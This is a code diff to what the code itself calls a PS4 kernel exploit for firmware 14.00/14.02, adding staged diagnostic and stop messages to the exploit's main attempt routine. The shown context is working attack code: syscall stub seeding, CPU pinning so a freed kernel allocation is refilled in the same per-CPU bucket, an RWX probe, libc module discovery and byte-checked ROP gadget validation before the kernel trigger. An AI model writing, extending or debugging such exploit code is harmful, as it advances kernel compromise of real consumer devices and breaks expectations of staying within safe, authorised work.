@@ -1906,16 +1906,20 @@ async function attempt(ctx, opts) {
   STATE.retry = false;
   say("afterglow -- ps4 kernel exploit, firmware 14.00 / 14.02 (raw13 host)");
 
+  say("AG-DIAG stage=K0 resolving-syscall-stubs");
   const missing = seedStubs();
   if (missing.length) {
+    say("AG-STOP code=MISSING-SYSCALL-STUBS missing=" + missing.join(","));
     say("  no libkernel stub for syscall " + missing.join(",") + " -- stopping here");
     return false;
   }
 
   /* the free and the refill have to happen on one core, or they land in
      different per cpu buckets and the hole is never refilled */
+  say("AG-DIAG stage=K1 cpu-affinity-start");
   const pin = pinCore();
   if (!pin.ok) {
+    say("AG-STOP code=CPU-AFFINITY-FAILED note=" + pin.note);
     say("  cpu pin failed (" + pin.note + ") -- refusing to go on.");
     say("  Unpinned, the free and the refill land in different per cpu buckets,");
     say("  the hole is filled by somebody else, and ring 0 continues on that");
@@ -1930,6 +1934,7 @@ async function attempt(ctx, opts) {
      precisely and stop rather than risk firing the kernel trigger while the
      guard's semantics remain unresolved. */
   {
+    say("AG-DIAG stage=K2 userland-RWX-observation; not-a-kernel-state-check");
     const m0 = sc(S.mmap, 0, 0x4000, 3, 0x1002, -1, 0);
     const mmapOk = m0.i32 !== -1;
     const mp = mmapOk ? sc(S.mprotect, v(m0.lo, m0.hi), 0x4000, 7) : null;
@@ -1937,28 +1942,37 @@ async function attempt(ctx, opts) {
     say("  userland RWX guard: mmap=" + (mmapOk ? "ok" : "failed")
       + ", mprotect=" + (rwxOk ? "ok" : mmapOk ? "failed" : "not-run"));
     if (rwxOk) {
+      say("AG-STOP code=USERLAND-RWX-GUARD; kernel-state=UNKNOWN; kernel-trigger=NOT-REACHED");
       say("  GUARD-TRIPPED: userland RWX mapping succeeded.");
       say("  This does not establish kernel-open state; stopping safely.");
       return false;
     }
   }
 
+  say("AG-DIAG stage=K3 libc-module-discovery-start");
   let lib = findLib("libSceLibcInternal.sprx");
   if (!lib.base) lib = findLibByShape();
   const libc = lib.base;
-  if (!libc) { say("  " + (lib.note || "libc is not mapped")); return false; }
+  if (!libc) {
+    say("AG-STOP code=LIBC-MODULE-UNRESOLVED note=" + (lib.note || "missing"));
+    say("  " + (lib.note || "libc is not mapped")); return false;
+  }
+  say("AG-DIAG stage=K3 libc-module-resolved method=" + (lib.at || "fallback") + " address=" + text(libc));
 
   const gad = {};
   for (const name in GADGETS) {
     const want = unhex(GADGETS[name][1]);
     const at = plus(libc, GADGETS[name][0]);
     if (!sameBytes(rdbuf(at, want.length), want)) {
+      say("AG-STOP code=LIBC-GADGET-MISMATCH name=" + name);
       say("  gadget " + name + " is missing -- this is not the libc build we know");
       return false;
     }
     gad[name] = at;
   }
 
+  say("AG-DIAG stage=K4 libc-gadgets-validated count=" + Object.keys(gad).length + " of " + Object.keys(GADGETS).length);
+  say("AG-DIAG stage=K5 kernel-leak-or-trigger-approaching; crash-may-prevent-further-logging");
   const shot = shooter(gad);
   const hostPage = plus(libc, HOST.page), hostFree = plus(libc, HOST.free);
 
